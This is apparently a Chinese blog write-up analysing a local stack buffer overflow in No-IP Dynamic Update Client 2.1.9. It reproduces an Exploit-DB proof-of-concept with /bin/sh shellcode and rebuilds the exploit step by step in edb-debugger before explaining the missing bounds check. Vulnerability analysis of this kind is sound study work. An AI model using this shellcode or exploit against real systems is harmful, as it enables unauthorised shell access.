title: No-IP Dynamic Update Client (DUC) 2.1.9 缓冲区溢出分析
date: 2016-03-28 14:31:49
tags: 缓冲区溢出
---
溢出原因：对用户输入的 IP 地址没有进行边界检查，导致本地溢出。[exploit db POC](https://www.exploit-db.com/exploits/25411/)
<!-- more -->
# I、实验环境
 - 操作系统： kali 3.18.0-kali3-686-pae #1 SMP Debian 3.18.6-1~kali2
 - 调试工具：edb-debugger
 - 应用程序：[No-IP](https://www.exploit-db.com/apps/3b0f5f2ff8637c73ab337be403252a60-noip-duc-linux.tar.gz)
 - 安装教程：[请参考](http://www.noip.com/support/knowledgebase/installing-the-linux-dynamic-update-client-on-ubuntu/)
<font color="red">Tips：</font> 在安装过程中，需要输入 no ip 账号密码，安装之前，请先前往[官网](https://www.noip.com/)注册。

# II、POC
## ① 原POC
```
#!/usr/bin/env python

import os

binary = "./noip-2.1.9-1/binaries/noip2-i686"

shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"\
            "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"\
            "\x80\xe8\xdc\xff\xff\xff/bin/sh"

nop = "\x90"
nop_slide = 296 - len(shellcode)

# (gdb) print &IPaddress
# $2 = (<data variable, no debug info> *) 0x80573bc
eip_addr = "\xbc\x73\x05\x08"

print "[*] Executing %s ..." % (binary)

os.system("%s -i %s%s%s" % (binary, nop*nop_slide, shellcode, eip_addr))
```

## ② POC 分析
 - os.system("%s -i %s%s%s" % (binary, nop*nop_slide, shellcode, eip_addr))
    执行命令 ./noip-2.1.9-1/binaries/noip2-i686 -i agrs
 - 参数：nop*nop_slide + shellcode + eip_addr
    即 "\x90"*251 + shellcode + eip_addr

## ③运行 POC
在 kali 下直接运行 POC：
![](https://ww3.sinaimg.cn/large/005CA6ZCgw1f2clo5dl0yj30k60850uu.jpg)
说明 shellcode 成功执行。

# III、调试程序
## ① 计算返回地址偏移
推荐使用 pattern.py 脚本进行计算。
**1、构造唯一字符串**
命令：
```
./pattern.py 350
```
构造长度为 350 的字符串
**2、使用此参数运行程序**
命令：
```
edb --run ./NO-IP/noip-2.1.9-1/binaries/noip2-i686 -i "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al"
```
结果：
![](https://ww3.sinaimg.cn/large/005CA6ZCgw1f2cmauvlk6j30me0b741s.jpg)
**3、计算偏移**
命令：
```
pattern.py 0x396a4138
```
结果
![](https://ww1.sinaimg.cn/large/005CA6ZCgw1f2cmdujrasj30k601ldg7.jpg)

则shellcode可构造为：nops + shellcode + ip_addr，其中 nops + shellcode 长度为 296。

## ② 构造 exploit
### 1、初始 exploit
根据上述分析，构造如下 exploit
```
#!/usr/bin/env python2

p = ''
p += "\x90" * 251
p += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
p += "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
p += "\x80\xe8\xdc\xff\xff\xff/bin/sh"

p += "aaaa"

print p
```
### 2、调试程序，定位出错点
**（1）、edb 命令：**
```
edb --run ./NO-IP/noip-2.1.9-1/binaries/noip2-i686 -i "`./NO-IP/exploit.py`"
```
**（2）、定位**
 - F10 运行程序
 - F8 一路单步执行程序，直到溢出
![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f2cmx0k4l1j30kk06utaa.jpg)

说明，在 0x08049aef 处 call 0x0804bfec 出错

**（3）、继续定位**
再次使用 edb 命令调试，并在 0x80049aef 处下断点，进入函数内部执行。
 - 在 0x08049aef 处下断点
 - F10 运行程序
 - 再次 F10 运行到断点处
 - F7 进入函数内部
 - F8 一路单步执行，直到函数返回前
    ![](https://ww3.sinaimg.cn/large/005CA6ZCgw1f2coqxiumij30ka0eswkh.jpg)

**（4）、首次试验**
![](https://ww2.sinaimg.cn/large/005CA6ZCgw1f2cox4ej37j30jo09mgn1.jpg)
![](https://ww1.sinaimg.cn/large/005CA6ZCgw1f2cowdm9vqj30jm09o0uf.jpg)

才发现，这个程序的栈、堆都是可执行的，简直不能忍！！！！！

ip_addr 换成 shellcode 起始地址 0xbffff34f。
nops(251) + payload + 0xbffff34f
可是发现执行出断错。因为执行shellcode之后，程序继续没有正常退出，继续执行，会报错。

### 3、查看堆
既然栈和堆都是可执行的，payload 在栈中，执行不成功，查看堆。
原始 POC 中的 ip_addr = 0x080573bc也在堆中，查看此地址附近的堆内容。

![](https://ww1.sinaimg.cn/large/005CA6ZCgw1f2crn7qyqrj30jx0ct79v.jpg)

ip_addr = 0x080573bc 正好是 shellcode 在堆中的起始地址。

OK，shellcode 构造好了。
```
#!/usr/bin/env python2

p = ''
p += "\x90" * 251
p += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
p += "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
p += "\x80\xe8\xdc\xff\xff\xff/bin/sh"

p += "\xbc\x73\x05\x08"

print p
```

![](https://ww4.sinaimg.cn/large/005CA6ZCgw1f2crrxgenlj30k8051wgb.jpg)

分析到此处，对于了解缓冲区溢出的人，都能理解 exploit db 中 POC 的构成了。
以下是分析漏洞成因。

# IV、漏洞成因
堆和栈中都有 shellcode 
shellcode 在堆中的起始地址：0x080573bc
在栈中的起始地址：0xbffff5bc

在调试程序过程中，一直观察 0x080573bc 和 0xbffff5bc 的变化
## ① 堆的变化
在 0x08049898 处 call 0x08049b65，将 shellcode 拷贝到堆中

![](https://ww3.sinaimg.cn/large/005CA6ZCgw1f2cx1v6c4tj30jx0cq0xk.jpg)

call 0x08049b65 之前的 mov 指令是设置参数
ebp + 12（0xbffff43c，参数起始地址的地址） 的值存放到 esp + 4
ebp + 8 （参数个数）的值存放到 esp 

![](https://ww3.sinaimg.cn/large/005CA6ZCgw1f2cx7qb5d2j30kd06341d.jpg)

栈中查看 0xbffff43c 的值为 0xbffff58d
内存中查看 0xbffff58d 处，命令 ./NO-IP/noip-2.1.9-1/binaries/noip2-i686 -i "`./NO-IP/exploit.py`" 的起始地址处。

因此，此代码段的作用是，将命令拷贝到堆 0x080573bc 处。

## ② 栈的变化
在 0x0804c050 处 call 0x08049348，将堆中的 shellcode 拷贝到栈中。

call 执行之前
![](https://ww1.sinaimg.cn/large/005CA6ZCgw1f2cxj0ad6bj30k80bujw4.jpg)

call 执行之后
![](https://ww2.sinaimg.cn/large/005CA6ZCgw1f2cxmgkk1nj30ka0btn1u.jpg)

call 0x08049348 有三个参数，分别存放于 esp,exp+4,esp+8
将 exp+4(&ip=%s) 和 esp+8(堆中shellcode的起始地址)  拷贝到栈 0xbffff250 处。

## ③ 漏洞成因
 - 输入命令 ./NO-IP/noip-2.1.9-1/binaries/noip2-i686 -i "`./NO-IP/exploit.py`",没有对参数进行边界检查
 - 先将整个命令拷贝至堆中
 - 然后在call 0x08049aef 时，将堆中的命令拷贝至栈中，参数溢出，淹没返回地址。

# V、参考文献
[No-IP Dynamic Update Client (DUC) 2.1.9 - Local IP Address Stack Overflow](https://www.exploit-db.com/exploits/25411/)

